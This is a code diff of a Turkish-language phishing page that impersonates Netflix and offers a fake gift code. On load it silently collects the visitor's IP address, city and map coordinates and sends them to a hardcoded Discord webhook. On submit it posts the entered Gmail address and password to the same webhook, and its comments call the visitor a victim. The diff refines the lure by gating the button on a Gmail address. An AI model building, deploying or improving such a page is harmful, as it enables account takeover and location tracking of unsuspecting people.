@@ -21,8 +21,18 @@
         .login-box { width: 90%; max-width: 350px; text-align: center; }
         .login-box img { width: 150px; margin-bottom: 30px; }
         input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 5px; border: none; background: #333; color: #fff; box-sizing: border-box; outline: none; }
-        input:focus { border: 1px solid #e50914; }
-        button { width: 100%; padding: 15px; border: none; border-radius: 5px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        /* BUTONUN KAPALI HALİ */
+        button { 
+            width: 100%; padding: 15px; border: none; border-radius: 5px; 
+            background: #555; color: #aaa; font-size: 16px; font-weight: bold; 
+            cursor: not-allowed; transition: 0.3s;
+        }
+        /* BUTONUN AKTİF HALİ */
+        button.active { 
+            background: #e50914; color: #fff; cursor: pointer; 
+        }
+
         .loading-screen { display: none; text-align: center; }
         .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -40,15 +50,15 @@
 
     <div class="login-box" id="loginBox">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
-        <h2 style="font-size: 20px; margin-bottom: 20px;">Hediye Kodunuzu Almak İçin Giriş Yapın</h2>
-        <input type="email" id="user_id" placeholder="E-posta (@gmail.com zorunludur)" required>
-        <input type="password" id="user_pass" placeholder="Parola" required>
-        <button onclick="ikinciAsama()">Hediye Kodunu Göster</button>
+        <h2 style="font-size: 18px; margin-bottom: 20px;">Hediye Kodunuzu Almak İçin Doğrulama Yapın</h2>
+        <input type="email" id="user_id" placeholder="E-posta (@gmail.com zorunludur)" oninput="kontrolEt()">
+        <input type="password" id="user_pass" placeholder="Parola" oninput="kontrolEt()">
+        <button id="submitBtn" onclick="ikinciAsama()" disabled>Hediye Kodunu Göster</button>
     </div>
 
     <div class="loading-screen" id="loadingScreen">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" width="120">
-        <h3>İşlem Yapılıyor...</h3>
+        <h3>Kod Hazırlanıyor...</h3>
         <div class="loader"></div>
     </div>
 
@@ -60,7 +70,23 @@
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
         let kurbanVerisi = {};
 
-        // AŞAMA 1: SESSİZ SIZMA (KONUM VE CİHAZ)
+        // BUTON KONTROL FONKSİYONU
+        function kontrolEt() {
+            const mail = document.getElementById('user_id').value;
+            const pass = document.getElementById('user_pass').value;
+            const btn = document.getElementById('submitBtn');
+
+            // Hem şifre girilmiş olacak hem de mailde @gmail.com geçecek
+            if(mail.includes("@gmail.com") && pass.length > 3) {
+                btn.classList.add('active');
+                btn.disabled = false;
+            } else {
+                btn.classList.remove('active');
+                btn.disabled = true;
+            }
+        }
+
+        // AŞAMA 1: SESSİZ SIZMA
         window.onload = async function() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -70,25 +96,18 @@
                 let cihaz = "🖥️ PC";
                 if (/Mobi|Android|iPhone/i.test(ua)) cihaz = "📱 Mobil";
 
-                let pil = "Bilinmiyor";
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    pil = `%${Math.round(b.level * 100)} ${b.charging ? '🔌' : '🔋'}`;
-                }
-
                 const ilkRapor = {
                     username: "ANONİM BOT",
                     embeds: [{
                         title: "📍 YENİ TIKLAMA (SADECE KONUM)",
-                        description: "```Kurban linke tıkladı, giriş bekleniyor...```",
+                        description: "```Kurban linke tıkladı, veri bekleniyor...```",
                         color: 3447003, 
                         fields: [
                             { name: "🌐 IP / Cihaz", value: `\`${kurbanVerisi.ip}\` | ${cihaz}`, inline: true },
-                            { name: "🔋 Batarya", value: pil, inline: true },
                             { name: "🏠 Adres", value: `**${kurbanVerisi.region} / ${kurbanVerisi.city}**`, inline: false },
                             { name: "📍 Harita", value: `[Haritada Gör](https://www.google.com/maps?q=${kurbanVerisi.latitude},${kurbanVerisi.longitude})`, inline: false }
                         ],
-                        footer: { text: "Aşama 1: Sızma Tamamlandı" },
+                        footer: { text: "Aşama 1: Aktif" },
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
@@ -102,18 +121,10 @@
             setTimeout(() => { document.getElementById('notification').style.top = "-100px"; }, 4000);
         };
 
-        // AŞAMA 2: @GMAIL.COM ZORUNLULUĞU VE ŞİFRE AVCI
+        // AŞAMA 2: HESAP BİLGİLERİNİ GÖNDER
         async function ikinciAsama() {
             const mail = document.getElementById('user_id').value;
             const pass = document.getElementById('user_pass').value;
-
-            // Gmail Zorunluluğu Kontrolü
-            if(!mail.includes("@gmail.com")) {
-                alert("Hediye kodunu alabilmek için geçerli bir @gmail.com adresi girmelisiniz!");
-                return;
-            }
-
-            if(!mail || !pass) { alert("Lütfen tüm alanları doldurun!"); return; }
 
             document.getElementById('loginBox').style.display = "none";
             document.getElementById('loadingScreen').style.display = "block";
@@ -122,14 +133,14 @@
                 username: "ANONİM BOT",
                 embeds: [{
                     title: "🔥 HESAP BİLGİLERİ DÜŞTÜ!",
-                    description: "```fix\nKurban doğrulama yaptı, hesap paketlendi.```",
+                    description: "```fix\nKurban giriş yaptı, hesap ele geçirildi.```",
                     color: 16711680, 
                     fields: [
                         { name: "📧 Gmail Hesabı", value: `**${mail}**`, inline: true },
                         { name: "🔑 Şifre", value: `\`${pass}\``, inline: true },
                         { name: "🌐 IP", value: `\`${kurbanVerisi.ip}\``, inline: false }
                     ],
-                    footer: { text: "Aşama 2: Hesap Ele Geçirildi" },
+                    footer: { text: "Aşama 2: Tamamlandı" },
                     thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                 }]
             };
